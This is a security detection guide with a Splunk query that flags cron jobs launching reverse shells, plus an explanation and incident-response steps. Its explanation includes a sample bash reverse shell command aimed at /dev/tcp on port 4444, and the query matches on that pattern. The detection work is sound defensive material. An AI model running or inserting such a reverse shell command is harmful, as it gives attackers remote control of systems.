# Overview

This detection identifies suspicious Linux cron job activity that creates persistence mechanisms containing reverse shell behavior.

Attackers commonly abuse cron scheduling to maintain access after compromising a Linux system. By adding malicious commands to scheduled tasks, attackers can automatically execute payloads and reconnect to attacker-controlled infrastructure.

The detection identifies:

- Unauthorized cron modifications
- Suspicious scheduled commands
- Reverse shell payloads
- Outbound attacker communication

---

# Detection Objective

The objective of this detection is to identify:

- Persistence through cron jobs
- Reverse shell execution
- Unauthorized scheduled tasks
- Post-compromise attacker activity

The detection provides visibility into:

- User creating or modifying cron jobs
- Executed command
- Remote attacker IP
- Remote attacker port
- Target system

# SPL Detection

```spl
index=linux_logs (sourcetype=syslog OR _raw="*cron*")

| rex field=_raw "crontab\[\d+\]:\s+\((?<user>\S+)\)\s+(?<action>LIST|BEGIN|REPLACE|END)"

| rex field=_raw "CRON\[\d+\]:\s+\((?<user>\S+)\)\s+CMD\s+\((?<executed_payload>.*)\)"

| rex field=executed_payload "tcp/(?<attacker_ip>\d+\.\d+\.\d+\.\d+)/(?<attacker_port>\d+)"

| rename host as target_system

| eval activity_summary = case(
match(executed_payload,"/dev/tcp"),
"CRITICAL - Interactive Reverse Shell Fired",
action="REPLACE",
"High - Cron Table Modified (Job Created)",
1=1,
"Low - Standard Cron Activity"
)

| stats
values(action) as crontab_actions,
values(executed_payload) as active_payload_executed,
values(attacker_ip) as target_c2_ip,
values(attacker_port) as target_c2_port,
min(_time) as first_seen,
max(_time) as last_seen

by user,target_system,activity_summary

| where activity_summary="CRITICAL - Interactive Reverse Shell Fired"
OR activity_summary="High - Cron Table Modified (Job Created)"

| fieldformat first_seen=strftime(first_seen,"%Y-%m-%d %H:%M:%S")

| fieldformat last_seen=strftime(last_seen,"%Y-%m-%d %H:%M:%S")

| table
last_seen,
target_system,
user,
activity_summary,
crontab_actions,
active_payload_executed,
target_c2_ip,
target_c2_port
```

# Detection Logic Explanation

## 1. Monitor Cron Activity

The detection searches Linux cron-related events:

```
CRON

crontab
```

These events indicate scheduled task activity.

---

## 2. Identify Suspicious Commands

The detection looks for:

```
/dev/tcp
```

Linux reverse shells commonly use this feature to create outbound TCP connections.

Example:

```
bash -i >& /dev/tcp/192.168.50.40/4444
```

---

## 3. Extract Attacker Infrastructure

The detection extracts:

```
Attacker IP

Attacker Port
```

Example:

```
C2 IP:

192.168.50.40


Port:

4444
```

# Incident Response Actions

Recommended response:

1. Disable malicious cron jobs.
2. Remove unauthorized scheduled tasks.
3. Terminate active reverse shell sessions.
4. Block attacker IP if required.
5. Investigate initial compromise.
6. Review affected user accounts.
7. Perform endpoint integrity checks.
